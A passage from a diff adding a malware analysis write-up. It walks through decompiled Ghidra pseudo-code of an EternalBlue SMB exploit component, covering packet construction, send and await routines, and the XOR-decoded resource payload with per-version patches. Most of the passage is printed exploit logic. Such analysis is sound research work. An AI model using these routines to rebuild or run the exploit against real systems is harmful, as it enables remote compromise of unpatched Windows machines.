+  uVar2 = 0;
+  local_8 = (cls_10002ccf)0x0;
+  param_9 = meth_10002ccf(&local_8,param_7,param_8,param_9,param_10);
+  if ((undefined4 *)param_9 != (undefined4 *)0x0) {
+    num_bytes = (int)local_8 + 0x24U & 0xffff;
+    uVar2 = (undefined)num_bytes;
+    _Src = (undefined4 *)
+           eternal_create_smb_message(num_bytes,0x32,0xc007,param_2,param_3,param_4,param_5,param_6)
+    ;
+    param_8 = _Src;
+    if (_Src == (undefined4 *)0x0) {
+      ppuVar5 = (undefined4 **)&param_9;
+    }
+    else {
+      puVar4 = (undefined4 *)allocate_memory(num_bytes);
+      if (puVar4 != (undefined4 *)0x0) {
+        iVar1 = 9;
+        puVar6 = puVar4;
+        while (iVar1 != 0) {
+          iVar1 = iVar1 + -1;
+          *puVar6 = *_Src;
+          _Src = _Src + 1;
+          puVar6 = puVar6 + 1;
+        }
+        memcpy(puVar4 + 9,param_9,(uint)local_8 & 0xffff);
+        eternal_free(&param_9);
+        eternal_free(&param_8);
+        goto LAB_100033bc;
+      }
+      eternal_free(&param_9);
+      ppuVar5 = &param_8;
+    }
+    eternal_free(ppuVar5);
+  }
+  puVar4 = (undefined4 *)0x0;
+LAB_100033bc:
+  if (puVar4 != (undefined4 *)0x0) {
+    *param_11 = *param_11 + (_param_10 & 0xffff);
+    param_9 = puVar4;
+    _Src = (undefined4 *)allocate_memory(0x1000);
+    param_8 = _Src;
+    if (_Src != (undefined4 *)0x0) {
+      _param_10 = 0;
+      iVar1 = eternal_send_message((int)puVar4,uVar2,param_1);
+      if ((iVar1 == 0) &&
+         (iVar1 = eternal_await_response(param_1,1,(char)_Src,&param_10), iVar1 == 0)) {
+        num_bytes = _param_10 & 0xffff;
+        uVar3 = *(undefined4 *)((int)_Src + 9);
+        _Dst = allocate_memory(num_bytes);
+        *param_12 = _Dst;
+        if (_Dst == (LPVOID)0x0) {
+          uVar3 = 0xffffffff;
+        }
+        else {
+          *param_13 = param_10;
+          memcpy(_Dst,_Src,num_bytes);
+        }
+        eternal_free(&param_8);
+        eternal_free(&param_9);
+        return uVar3;
+      }
+      eternal_free(&param_8);
+    }
+    eternal_free(&param_9);
+  }
+  return 0xffffffff;
+}
+```
+
+First we see a call to `meth_10002ccf`.
+
+### meth_10002ccf
+
+```cpp
+undefined * __thiscall
+meth_10002ccf(cls_10002ccf *this,undefined4 param_1,undefined4 *param_2,void *param_3,ushort param_4){
+  undefined *puVar1;
+  
+  if (((param_4 == 0) || (param_3 != (void *)0x0)) && (param_2 != (undefined4 *)0x0)) {
+    *(ushort *)&this->mbr_0 = param_4 + 0x2e;
+    puVar1 = (undefined *)allocate_memory((uint)(ushort)(param_4 + 0x2e));
+    if (puVar1 != (undefined *)0x0) {
+      *(undefined2 *)(puVar1 + 0x13) = 0xc;
+      *(undefined2 *)(puVar1 + 1) = 0xc;
+      *(undefined2 *)(puVar1 + 0x15) = 0x42;
+      *(undefined2 *)(puVar1 + 0x19) = 0x4e;
+      *(undefined2 *)(puVar1 + 5) = 1;
+      *(ushort *)(puVar1 + 0x1f) = param_4 + 0xd;
+      *(undefined2 *)(puVar1 + 0x1d) = 0xe;
+      *puVar1 = 0xf;
+      *(undefined4 *)(puVar1 + 0xd) = param_1;
+      puVar1[0x1b] = 1;
+      *(undefined4 *)(puVar1 + 0x22) = *param_2;
+      *(undefined4 *)(puVar1 + 0x26) = param_2[1];
+      *(undefined4 *)(puVar1 + 0x2a) = param_2[2];
+      if (param_4 != 0) {
+        *(ushort *)(puVar1 + 3) = param_4;
+        *(undefined4 *)(puVar1 + 0xd) = param_1;
+        *(ushort *)(puVar1 + 0x17) = param_4;
+        memcpy(puVar1 + 0x2e,param_3,(uint)param_4);
+      }
+    }
+  }
+  else {
+    puVar1 = (undefined *)0x0;
+  }
+  return puVar1;
+}
+```
+
+This again looks like the reaction of a payload message.
+
+### Back to FUN_1000330e
+
+Back we then see that using the just constructed payload a new SMB message is created of the `SMB_COM_TRANSACTION2` type. This message is then sent, the response awaited and returned. We will rename the function `eternal_send_transaction2_smb_msg`.
+
+### Back to eternal_blue_main
+
+Next we see a lot more error checks happen. Eventually we arrive at what appears to be a function call most likely on the object `param_4`, which if we recall is the function that was passed as an arguemnt to the `eternal_blue_main` function. This function probably almost makes an SMB related message or payload.
+
+```cpp
+(*(code *)param_4)(param_5,param_6,puVar9,((uint)bVar11 - 1 & 0x200) + 0x1070,puVar7,((uint)bVar11 - 1 & 0xfffffa00) + 0x7ce,&local_30,&local_1c,param_7,param_8,param_9,param_10);
+```
+
+Shortly after this call we see a call to `FUN_100020ea`.
+
+### FUN_100020ea (EternalBlue)
+
+```cpp
+undefined4 FUN_100020ea(SIZE_T *param_1,int param_2,char param_3){
+  byte *pbVar1;
+  SIZE_T SVar2;
+  char cVar3;
+  HRSRC resource;
+  int iVar4;
+  LPVOID pvVar5;
+  LPVOID *unaff_ESI;
+  uint uVar6;
+  
+  cVar3 = eternal_DAT_1001f8fc;
+  uVar6 = 0;
+  if (eternal_DAT_1001f8fc == '\0') {
+    resource = FindResourceW(DLL_handle,(LPCWSTR)&DAT_00000004,(LPCWSTR)0xa);
+    if (resource == (HRSRC)0x0) {
+      iVar4 = 0;
+    }
+    else {
+      iVar4 = extract_and_inflate_resource(param_1,resource,unaff_ESI);
+    }
+    if (iVar4 == 0) {
+      return 0xffffffff;
+    }
+    SVar2 = *param_1;
+    if (SVar2 != 1) {
+      do {
+        *(uint *)((int)*unaff_ESI + uVar6) = *(uint *)((int)*unaff_ESI + uVar6) ^ 0x86868686;
+        uVar6 = uVar6 + 4;
+      } while (uVar6 < SVar2 - 1);
+    }
+    pbVar1 = (byte *)((int)*unaff_ESI + (SVar2 - 1));
+    *pbVar1 = *pbVar1 ^ 0x86;
+    *(int *)((int)*unaff_ESI + 0x591) = param_2 + 0xd70;
+    if (param_3 == '\x02') {
+      *(undefined *)((int)*unaff_ESI + 0x26) = 0xa0;
+      *(undefined *)((int)*unaff_ESI + 0x52) = 0x90;
+      *(undefined2 *)((int)*unaff_ESI + 0x270) = 0x164;
+      *(undefined2 *)((int)*unaff_ESI + 0x29e) = 0;
+      *(undefined *)((int)*unaff_ESI + 0x2b6) = 0;
+    }
+    if (param_3 == '\x03') {
+      *(undefined *)((int)*unaff_ESI + 0x26) = 0x90;
+      *(undefined *)((int)*unaff_ESI + 0x52) = 0x80;
+      *(undefined *)((int)*unaff_ESI + 0x270) = 0x58;
+      *(undefined *)((int)*unaff_ESI + 0x2b6) = 0;
+    }
+    if ((param_3 != '\x04') && (param_3 != '\x06')) {
+      return 0;
+    }
+    *(undefined *)((int)*unaff_ESI + 0x26) = 0x78;
+    *(undefined *)((int)*unaff_ESI + 0x52) = 0x68;
+    *(undefined *)((int)*unaff_ESI + 0x270) = 0x68;
+  }
+  if (cVar3 == '\x01') {
+    *param_1 = 0x17f8;
+    pvVar5 = allocate_memory(0x17f8);
+    *unaff_ESI = pvVar5;
+    if (pvVar5 == (LPVOID)0x0) {
+      return 0xffffffff;
+    }
+    if (uVar6 < *param_1 - 1) {
+      SVar2 = *param_1;
+      do {
+        *(uint *)(uVar6 + (int)*unaff_ESI) = *(uint *)(&UNK_10010bb8 + uVar6) ^ 0x64646464;
+        uVar6 = uVar6 + 4;
+      } while (uVar6 < SVar2 - 1);
+    }
+    *(int *)((int)*unaff_ESI + 0x86e) = param_2 + 0xf8a;
+    if ((param_3 == '\x02') || (param_3 == '\x03')) {
+      *(undefined2 *)((int)*unaff_ESI + 0x846) = 0x2b0;
+      *(undefined2 *)((int)*unaff_ESI + 0x852) = 0x290;
+      *(undefined *)((int)*unaff_ESI + 0x856) = 0x90;
+      *(undefined *)((int)*unaff_ESI + 0x85e) = 0;
+    }
+    if ((param_3 == '\x04') || (param_3 == '\x06')) {
+      *(undefined2 *)((int)*unaff_ESI + 0x846) = 0x280;
+      *(undefined2 *)((int)*unaff_ESI + 0x852) = 0x260;
+      *(undefined *)((int)*unaff_ESI + 0x856) = 0x90;
+    }
+  }
+  return 0;
+}
+```
+
+We start by adding custom storage for `ESI`.
+
+```cpp
+undefined4 FUN_100020ea(SIZE_T *param_1,int param_2,char param_3,LPVOID *param_4){
+  byte *pbVar1;
+  SIZE_T SVar2;
+  char cVar3;
+  HRSRC resource;
+  int iVar4;
+  LPVOID pvVar5;
+  uint uVar6;
+  
+  cVar3 = eternal_DAT_1001f8fc;
+  uVar6 = 0;
+  if (eternal_DAT_1001f8fc == '\0') {
+    resource = FindResourceW(DLL_handle,(LPCWSTR)&DAT_00000004,(LPCWSTR)0xa);
+    if (resource == (HRSRC)0x0) {
+      iVar4 = 0;
+    }
+    else {
+      iVar4 = extract_and_inflate_resource(param_1,resource,param_4);
+    }
+    if (iVar4 == 0) {
+      return 0xffffffff;
+    }
+    SVar2 = *param_1;
+    if (SVar2 != 1) {
+      do {
+        *(uint *)((int)*param_4 + uVar6) = *(uint *)((int)*param_4 + uVar6) ^ 0x86868686;
+        uVar6 = uVar6 + 4;
+      } while (uVar6 < SVar2 - 1);
+    }
+    pbVar1 = (byte *)((int)*param_4 + (SVar2 - 1));
+    *pbVar1 = *pbVar1 ^ 0x86;
+    *(int *)((int)*param_4 + 0x591) = param_2 + 0xd70;
+    if (param_3 == '\x02') {
+      *(undefined *)((int)*param_4 + 0x26) = 0xa0;
+      *(undefined *)((int)*param_4 + 0x52) = 0x90;
+      *(undefined2 *)((int)*param_4 + 0x270) = 0x164;
+      *(undefined2 *)((int)*param_4 + 0x29e) = 0;
+      *(undefined *)((int)*param_4 + 0x2b6) = 0;
+    }
+    if (param_3 == '\x03') {
+      *(undefined *)((int)*param_4 + 0x26) = 0x90;
+      *(undefined *)((int)*param_4 + 0x52) = 0x80;
+      *(undefined *)((int)*param_4 + 0x270) = 0x58;
+      *(undefined *)((int)*param_4 + 0x2b6) = 0;
+    }
+    if ((param_3 != '\x04') && (param_3 != '\x06')) {
+      return 0;
+    }
+    *(undefined *)((int)*param_4 + 0x26) = 0x78;
+    *(undefined *)((int)*param_4 + 0x52) = 0x68;
+    *(undefined *)((int)*param_4 + 0x270) = 0x68;
+  }
+  if (cVar3 == '\x01') {
+    *param_1 = 0x17f8;
+    pvVar5 = allocate_memory(0x17f8);
+    *param_4 = pvVar5;
+    if (pvVar5 == (LPVOID)0x0) {
+      return 0xffffffff;
+    }
+    if (uVar6 < *param_1 - 1) {
+      SVar2 = *param_1;
+      do {
+        *(uint *)(uVar6 + (int)*param_4) = *(uint *)(&UNK_10010bb8 + uVar6) ^ 0x64646464;
+        uVar6 = uVar6 + 4;
+      } while (uVar6 < SVar2 - 1);
+    }
+    *(int *)((int)*param_4 + 0x86e) = param_2 + 0xf8a;
+    if ((param_3 == '\x02') || (param_3 == '\x03')) {
+      *(undefined2 *)((int)*param_4 + 0x846) = 0x2b0;
+      *(undefined2 *)((int)*param_4 + 0x852) = 0x290;
+      *(undefined *)((int)*param_4 + 0x856) = 0x90;
+      *(undefined *)((int)*param_4 + 0x85e) = 0;
+    }
+    if ((param_3 == '\x04') || (param_3 == '\x06')) {
+      *(undefined2 *)((int)*param_4 + 0x846) = 0x280;
+      *(undefined2 *)((int)*param_4 + 0x852) = 0x260;
+      *(undefined *)((int)*param_4 + 0x856) = 0x90;
+    }
+  }
+  return 0;
+}
+```
+
+The function itself however is rather interesting. The 4th (and final) resource stored in the malware is loaded and extracted in this function.
+
+After it is loaded we see that the data is XOR'ed with `0x86868686` so it uses a similar method of hiding the data as the smaller payloads we saw earlier. We also see several follow up changes being made to the payload probably either to set certain data or to further restore the original payload.
+
+It would also seem like the part at the bottom of the function is an alternative to loading the resource as the global `eternal_DAT_1001f8fc` determines what is actually loaded and depending on this global either, but never both of the if statements can execute.
+
+Either way we will rename this function to `eternal_blue_load_payload`.
+
+### Back to eternal_blue_main
+
+After the payload is loaded we see some more error check to check if the load was succesful and the payload is passed around quite a bit. The next function call we see is `FUN_100035fa`.
+
+### FUN_100035fa (EternalBlue)
+
+```cpp
+undefined4
+FUN_100035fa(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,LPVOID param_6,undefined4 param_7,undefined4 *param_8){
+  undefined4 in_EAX;
+  undefined4 uVar1;
+  LPVOID pvVar2;
+  int iVar3;
+  undefined4 local_8;
+  
+  local_8 = 0;
+  param_8 = FUN_10002c1e(param_1,param_2,param_3,param_4,param_5,(short)param_6,param_7,param_8,
+                         (ushort *)&local_8);
+  if (param_8 == (undefined4 *)0x0) {
+    uVar1 = 0xffffffff;
+  }
+  else {
+    pvVar2 = allocate_memory(0x1000);
+    param_6 = pvVar2;
+    if (pvVar2 == (LPVOID)0x0) {
+      eternal_free(&param_8);
+      uVar1 = 0xffffffff;
+    }
+    else {
+      param_7 = 0;
+      iVar3 = eternal_send_message((int)param_8,(char)local_8,in_EAX);
+      if ((iVar3 == 0) &&
+         (iVar3 = eternal_await_response(in_EAX,1,(char)pvVar2,&param_7), iVar3 == 0)) {
+        uVar1 = *(undefined4 *)((int)pvVar2 + 9);
+      }
+      else {
+        uVar1 = 0xffffffff;
+      }
+      eternal_free(&param_6);
+      eternal_free(&param_8);
+    }
+  }
+  return uVar1;
+}
+```
+
+This again follows the famliar format so next we look at `FUN_10002c1e`.
+
+### FUN_10002c1e (EternalBlue)
+
+```cpp
+undefined4 * FUN_10002c1e(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,undefined2 param_6,undefined4 param_7,undefined4 *param_8,ushort *param_9){
+  ushort *puVar1;
+  undefined4 *puVar2;
+  int iVar3;
+  ushort **ppuVar4;
+  undefined4 *puVar5;
+  undefined4 *puVar6;
+  
+  puVar1 = param_9;
+  param_9 = (ushort *)FUN_10002adf(param_7,param_8);
+  if ((undefined4 *)param_9 != (undefined4 *)0x0) {
+    *puVar1 = 0x24;
+    param_8 = (undefined4 *)
+              eternal_create_smb_message(0x24,0x25,param_1,param_2,param_3,param_4,param_5,param_6);
+    if (param_8 == (undefined4 *)0x0) {
+      ppuVar4 = &param_9;
+    }
+    else {
+      puVar2 = (undefined4 *)allocate_memory((uint)*puVar1);
+      if (puVar2 != (undefined4 *)0x0) {
+        iVar3 = 9;
+        puVar5 = param_8;
+        puVar6 = puVar2;
+        while (iVar3 != 0) {
+          iVar3 = iVar3 + -1;
+          *puVar6 = *puVar5;
+          puVar5 = puVar5 + 1;
+          puVar6 = puVar6 + 1;
+        }
+        memcpy(puVar2 + 9,param_9,0);
+        eternal_free(&param_8);
+        eternal_free(&param_9);
+        return puVar2;
+      }
+      eternal_free(&param_9);
+      ppuVar4 = (ushort **)&param_8;
+    }
+    eternal_free(ppuVar4);
+    param_9 = (ushort *)0x0;
+  }
+  return (undefined4 *)param_9;
+}
+```
+
+It seems like the creation of this message is a bit more involved so we look at `FUN_10002adf`.
+
+### FUN_10002adf (EternalBlue)
+
+```cpp
+void __fastcall FUN_10002adf(undefined2 param_1,undefined2 param_2,char param_1_00,char param_2_00){
+  byte bVar1;
+  ushort *in_EAX;
+  undefined *puVar2;
+  byte *pbVar3;
+  byte *pbVar4;
+  int iVar5;
+  
+  *in_EAX = 0x23;
+  if (param_1_00 == '\x02') {
+    *in_EAX = 0x2a;
+  }
+  if (param_1_00 == '\x03') {
+    *in_EAX = *in_EAX + 0x59;
+  }
+  puVar2 = (undefined *)allocate_memory((uint)*in_EAX);
+  if (puVar2 != (undefined *)0x0) {
+    *puVar2 = 0x10;
+    puVar2[0x1b] = 2;
+    if (param_1_00 == '\x01') {
+      *(undefined2 *)(puVar2 + 3) = 1;
+      *(undefined2 *)(puVar2 + 7) = 1;
+      *(undefined2 *)(puVar2 + 0x1d) = 0x23;
+      *(undefined2 *)(puVar2 + 5) = param_2;
+      *(undefined4 *)(puVar2 + 0xd) = 0x1000;
+      *(undefined2 *)(puVar2 + 0x1f) = param_1;
+    }
+    if (param_1_00 == '\0') {
+      *(undefined4 *)(puVar2 + 0xd) = 1;
+      *(undefined2 *)(puVar2 + 3) = param_2;
+      *(undefined2 *)(puVar2 + 0x1d) = 0x36;
+      *(undefined2 *)(puVar2 + 0x1f) = param_1;
+    }
+    if (param_1_00 == '\x02') {
+      *(undefined2 *)(puVar2 + 0x15) = 0x4a;
+      *(undefined2 *)(puVar2 + 0x19) = 0x4a;
+      *(undefined2 *)(puVar2 + 0x21) = 7;
+      *(undefined2 *)(puVar2 + 0x23) = 0x505c;
+      *(undefined2 *)(puVar2 + 0x25) = 0x5049;
+      *(undefined2 *)(puVar2 + 5) = param_2;
+      *(undefined2 *)(puVar2 + 7) = param_2;
+      *(undefined4 *)(puVar2 + 0x1d) = 0x23;
+      *(undefined2 *)(puVar2 + 0x27) = 0x5c45;
+    }
+    if (param_1_00 == '\x03') {
+      *(undefined2 *)(puVar2 + 7) = 0x1000;
+      *(undefined2 *)(puVar2 + 0xb) = 8;
+      *(undefined2 *)(puVar2 + 0x17) = 0x48;
+      *(undefined2 *)(puVar2 + 0x1f) = param_1;
+      *(undefined2 *)(puVar2 + 0x1d) = 0x26;
+      iVar5 = 0x59;
+      *(undefined2 *)(puVar2 + 0x15) = param_2;
+      *(undefined2 *)(puVar2 + 0x19) = param_2;
+      *(undefined2 *)(puVar2 + 0x21) = 0x59;
+      *(undefined2 *)(puVar2 + 3) = 0x48;
+      *(undefined4 *)(puVar2 + 0xd) = 1000;
+      pbVar4 = &DAT_10018bd8;
+      pbVar3 = puVar2 + 0x23;
+      do {
+        bVar1 = *pbVar4;
+        pbVar4 = pbVar4 + 1;
+        *pbVar3 = bVar1 ^ 0x25;
+        pbVar3 = pbVar3 + 1;
+        iVar5 = iVar5 + -1;
+      } while (iVar5 != 0);
+      if (param_2_00 == '\0') {
+        *(undefined4 *)(puVar2 + 0x54) = 0x12345778;
+        *(undefined4 *)(puVar2 + 0x58) = 0xabcd1234;
+        *(undefined4 *)(puVar2 + 0x5c) = 0x230100ef;
+        *(undefined4 *)(puVar2 + 0x60) = 0xab896745;
+      }
+    }
+  }
+  return;
+}
+```
+
+This looks more like the creation of an SMB message we are used to. The main thing that appears missing however is how the result is returned. Looking at the ASM this appears to be done using register `AL`. We will rename the function to `eternal_create_smb_payload`.
+
+### Back to FUN_10002c1e
+
+Back we see that the type of the message being created is `0x25` meaning `SMB_COM_TRANSACTION`. So we will rename the function `eternal_create_transaction_smb_msg`.
+
+### Back to FUN_100035fa
+
+Back here we see the typical send and await structure agian. We will rename this function to `eternal_send_transaction_smb_msg`.
+
+### Back to eternal_blue_main
+
+After some more checks we see a huge call of functions we start with the first `FUN_10003ec8`.
+
+### FUN_10003ec8 (EternalBlue)
+
+```cpp
+undefined4 FUN_10003ec8(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6,ushort *param_7){
+  byte bVar1;
+  byte *in_EAX;
+  int iVar2;
+  undefined4 *puVar3;
+  int iVar4;
+  undefined4 uVar5;
+  uint uVar6;
+  undefined4 *local_10;
+  SIZE_T local_c;
+  uint local_8;
+  
+  *in_EAX = 0;
+  while( true ) {
+    iVar2 = FUN_10003734(param_1,(short)param_2,(short)param_3,(short)param_4,(short)param_5,
+                         (short)param_6,param_7,*in_EAX);
+    if (iVar2 == -1) {
+      return 0xffffffff;
+    }
+    if (iVar2 == 0) break;
+    *in_EAX = *in_EAX + 1;
+    if (1 < *in_EAX) {
+      return 0xffffffff;
+    }
+  }
+  iVar2 = eternal_send_transaction_smb_msg
+                    (0xc007,param_2,param_3,param_4,param_5,param_6,3,(uint)*in_EAX,(uint)*param_7);
+  if (iVar2 != 0) {
+    return 0xffffffff;
+  }
+  local_8 = 0;
+  if (*in_EAX == 0) {
+    local_8 = 0x48;
+  }
+  if (*in_EAX == 1) {
+    local_8 = 0x38;
+  }
+  local_c = local_8 + 0x420;
+  puVar3 = (undefined4 *)allocate_memory(local_c);
+  if (puVar3 != (undefined4 *)0x0) {
+    bVar1 = *in_EAX;
+    if (bVar1 == 0) {
+      *puVar3 = 0x3000005;
+      puVar3[1] = 0x10;
+      puVar3[2] = local_c & 0xffff;
+      puVar3[3] = 1;
+      puVar3[4] = 0x450;
+      puVar3[5] = 0x2d0000;
+      puVar3[6] = 0x32e2a8;
+      puVar3[7] = 1;
+      puVar3[9] = 1;
+      puVar3[0xb] = 0x31e5a8;
+      puVar3[0xc] = 0x4200420;
+      puVar3[0xd] = 0x1a72c0;
+      puVar3[0xe] = 0x210;
+      puVar3[0x10] = 0x210;
+    }
+    if (bVar1 == 1) {
+      *puVar3 = 0x3000005;
+      puVar3[1] = 0x10;
+      puVar3[2] = local_c & 0xffff;
+      puVar3[3] = 1;
+      puVar3[4] = 0x440;
+      puVar3[5] = 0x80000;
+      puVar3[7] = 100;
+      puVar3[8] = 100;
+      puVar3[9] = 100;
+      puVar3[10] = 0x308140;
+      puVar3[0xb] = 0x16;
+      puVar3[0xc] = 0x145418;
+      puVar3[0xd] = 0x16;
+    }
+    if (bVar1 == 0) {
+      local_8 = local_8 + 0xfffc;
+    }
+    uVar6 = local_8 & 0xffff;
+    iVar2 = 0;
+    local_10 = puVar3;
+    do {
+      iVar4 = rand();
+      *(char *)((int)puVar3 + iVar2 + uVar6) = (char)iVar4 + '\x01';
+      iVar2 = iVar2 + 1;
+    } while (iVar2 < 0x420);
+    uVar5 = FUN_10003863(param_1,(short)param_2,(short)param_3,(short)param_4,(short)param_5,
+                         (short)param_6,*param_7,'\x0e',puVar3);
+    eternal_free(&local_10);
+    return uVar5;
+  }
+  return 0xffffffff;
+}
+```
+
+This function first starts off with a while loop on `FUN_10003734`.
+
+### FUN_10003734 (EternalBlue)
+
+```cpp
+undefined4 FUN_10003734(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,ushort param_6,undefined2 *param_7,char param_8){
+  undefined2 uVar1;
+  LPVOID pvVar2;
+  int iVar3;
+  undefined num_bytes;
+  undefined4 *puVar4;
+  undefined2 *puVar5;
+  undefined4 *puVar6;
+  undefined4 *puVar7;
+  undefined4 uVar8;
+  undefined3 in_stack_00000021;
+  cls_10002d82 local_8;
+  
+  num_bytes = 0;
+  local_8 = (cls_10002d82)0x0;
+  _param_8 = (undefined4 *)meth_10002d82(&local_8,param_8);
+  if (_param_8 != (undefined4 *)0x0) {
+    _num_bytes = (int)local_8 + 0x24U & 0xffff;
+    num_bytes = (undefined)_num_bytes;
+    puVar6 = (undefined4 *)
+             eternal_create_smb_message
+                       (_num_bytes,0xa2,0xc007,param_2,param_3,param_4,param_5,(short)_param_6);
+    _param_6 = puVar6;
+    if (puVar6 == (undefined4 *)0x0) {
+      puVar5 = (undefined2 *)&param_8;
+    }
+    else {
+      puVar4 = (undefined4 *)allocate_memory(_num_bytes);
+      if (puVar4 != (undefined4 *)0x0) {
+        iVar3 = 9;
+        puVar7 = puVar4;
+        while (iVar3 != 0) {
+          iVar3 = iVar3 + -1;
+          *puVar7 = *puVar6;
+          puVar6 = puVar6 + 1;
+          puVar7 = puVar7 + 1;
+        }
+        memcpy(puVar4 + 9,_param_8,(uint)local_8 & 0xffff);
+        eternal_free(&param_8);
+        eternal_free(&param_6);
+        goto LAB_100037dc;
+      }
+      eternal_free(&param_8);
+      puVar5 = &param_6;
+    }
+    eternal_free(puVar5);
+  }
+  puVar4 = (undefined4 *)0x0;
+LAB_100037dc:
+  if (puVar4 != (undefined4 *)0x0) {
+    _param_8 = puVar4;
+    pvVar2 = allocate_memory(0x1000);
+    if (pvVar2 != (LPVOID)0x0) {
+      _param_6 = (undefined4 *)0x0;
+      iVar3 = eternal_send_message((int)puVar4,num_bytes,param_1);
+      if ((iVar3 == 0) &&
+         (iVar3 = eternal_await_response(param_1,1,(char)pvVar2,&param_6), iVar3 == 0)) {
+        if (param_6 < 0x2b) {
+          uVar1 = 0xffff;
+        }
+        else {
+          uVar1 = *(undefined2 *)((int)pvVar2 + 0x2a);
+        }
+        uVar8 = *(undefined4 *)((int)pvVar2 + 9);
+        *param_7 = uVar1;
+      }
+      else {
+        uVar8 = 0xffffffff;
+      }
+      eternal_free(&param_5);
+      eternal_free(&param_8);
+      return uVar8;
+    }
+    eternal_free(&param_8);
+  }
+  return 0xffffffff;
+}
+```
+
+This function appears to create a payload using `meth_10002d82`.
+
+### meth_10002d82
+
+```cpp
+void __thiscall meth_10002d82(cls_10002d82 *this,char param_1){
+  undefined2 *puVar1;
+  uint uVar2;
+  byte bVar3;
+  ushort uVar4;
+  undefined2 uVar5;
+  undefined1 *local_8;
+  
+  uVar5 = 0;
+  uVar4 = 0;
+  local_8 = (undefined1 *)0x0;
+  if (param_1 == '\0') {
+    uVar4 = 0xf;
+    local_8 = &DAT_10018bc4;
+    uVar5 = 0xc;
+  }
+  if (param_1 == '\x01') {
+    uVar4 = 0x11;
+    local_8 = &DAT_10018b34;
+    uVar5 = 0xe;
+  }
+  *(ushort *)&this->mbr_0 = uVar4 + 0x33;
+  puVar1 = (undefined2 *)allocate_memory((uint)(ushort)(uVar4 + 0x33));
+  if (puVar1 != (undefined2 *)0x0) {
+    *(undefined2 *)((int)puVar1 + 3) = 0x62;
+    bVar3 = 0;
+    *puVar1 = 0xff18;
+    puVar1[3] = uVar5;
+    *(undefined4 *)(puVar1 + 4) = 0x16;
+    *(undefined4 *)(puVar1 + 8) = 0x2019f;
+    *(undefined4 *)(puVar1 + 0x10) = 3;
+    *(undefined4 *)(puVar1 + 0x12) = 1;
+    *(undefined4 *)(puVar1 + 0x14) = 0x40;
+    *(undefined4 *)(puVar1 + 0x16) = 2;
+    *(undefined *)(puVar1 + 0x18) = 3;
+    *(ushort *)((int)puVar1 + 0x31) = uVar4;
+    uVar2 = 0;
+    while ((ushort)uVar2 < uVar4) {
+      uVar2 = (uint)bVar3;
+      bVar3 = bVar3 + 1;
+      *(byte *)(uVar2 + 0x33 + (int)puVar1) = local_8[uVar2] ^ 0xa2;
+      uVar2 = (uint)bVar3;
+    }
+  }
+  return;
+}
+```
+
+As expected this looks like the creation of a payload.
+
+### Back to FUN_10003734
+
+After creating the payload we see a new SMB message being created of type `0xa2` which maps to `SMB_COM_NT_CREATE_ANDX`. This message is then initialised and sent. A response is then awaited and returned. We will rename function to `eternal_send_nt_create_smb_msg`.
+
+### Back to FUN_10003ec8
+
+Back we then see that if this message sent succesfully a transaction SMB message is also sent. Finally a few arrays are initialised with data, which could be either payload data or a new message. In either case the data is passed to `FUN_10003863`.
+
+### FUN_10003863 (EternalBlue)
+
+```cpp
+undefined4 FUN_10003863(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,undefined2 param_6,undefined2 param_7,char param_8,void *param_9){
+  LPVOID pvVar1;
+  int iVar2;
+  undefined4 *puVar3;
+  void **ppvVar4;
+  undefined4 *puVar5;
+  undefined4 *puVar6;
+  undefined4 uVar7;
+  undefined3 in_stack_00000021;
+  undefined local_c;
+  
+  local_c = 0;
+  param_9 = FUN_10002e30(param_8,(short)_param_7,param_9);
+  if ((char *)param_9 != (char *)0x0) {
+    local_c = 0x24;
+    puVar5 = (undefined4 *)
+             eternal_create_smb_message(0x24,0x2f,0xc007,param_2,param_3,param_4,param_5,param_6);
+    _param_7 = puVar5;
+    if (puVar5 == (undefined4 *)0x0) {
+      ppvVar4 = &param_9;
+    }
+    else {
+      puVar3 = (undefined4 *)allocate_memory(0x24);
+      if (puVar3 != (undefined4 *)0x0) {
+        iVar2 = 9;
+        puVar6 = puVar3;
+        while (iVar2 != 0) {
+          iVar2 = iVar2 + -1;
+          *puVar6 = *puVar5;
+          puVar5 = puVar5 + 1;
+          puVar6 = puVar6 + 1;
+        }
+        memcpy(puVar3 + 9,param_9,0);
+        eternal_free(&param_9);
+        eternal_free(&param_7);
+        goto LAB_10003916;
+      }
+      eternal_free(&param_9);
+      ppvVar4 = (void **)&param_7;
+    }
+    eternal_free(ppvVar4);
+    local_c = 0x24;
+  }
+  puVar3 = (undefined4 *)0x0;
+LAB_10003916:
+  if (puVar3 != (undefined4 *)0x0) {
+    param_9 = puVar3;
+    pvVar1 = allocate_memory(0x1000);
+    _param_8 = pvVar1;
+    if (pvVar1 != (LPVOID)0x0) {
+      _param_7 = (undefined4 *)0x0;
+      iVar2 = eternal_send_message((int)puVar3,local_c,param_1);
+      if ((iVar2 == 0) &&
+         (iVar2 = eternal_await_response(param_1,1,(char)pvVar1,&param_7), iVar2 == 0)) {
+        uVar7 = *(undefined4 *)((int)pvVar1 + 9);
+      }
+      else {
+        uVar7 = 0xffffffff;
+      }
+      eternal_free(&param_8);
+      eternal_free(&param_9);
+      return uVar7;
+    }
+    eternal_free(&param_9);
+  }
+  return 0xffffffff;
+}
+```
+
+This function first starts off with a call to `FUN_10002e30`.
+
+### FUN_10002e30 (EternalBlue)
+
+```cpp
+char * FUN_10002e30(char param_1,undefined2 param_2,void *param_3){
+  char *pcVar1;
+  ushort *unaff_EBX;
+  ushort unaff_DI;
+  
+  if ((unaff_DI == 0) || (param_3 != (void *)0x0)) {
+    *unaff_EBX = unaff_DI + 0x20;
+    if (param_1 == '\f') {
+      *unaff_EBX = unaff_DI + 0x1c;
+    }
+    pcVar1 = (char *)allocate_memory((uint)*unaff_EBX);
+    if (pcVar1 != (char *)0x0) {
+      *(undefined4 *)(pcVar1 + 0xb) = 0xffffffff;
+      *pcVar1 = param_1;
+      pcVar1[1] = -1;
+      *(undefined2 *)(pcVar1 + 5) = param_2;
+      if (param_1 == '\f') {
+        *(undefined2 *)(pcVar1 + 3) = 0x3c;
+        *(undefined2 *)(pcVar1 + 0xf) = 4;
+        *(undefined2 *)(pcVar1 + 0x11) = 0xfe00;
+        *(ushort *)(pcVar1 + 0x15) = unaff_DI;
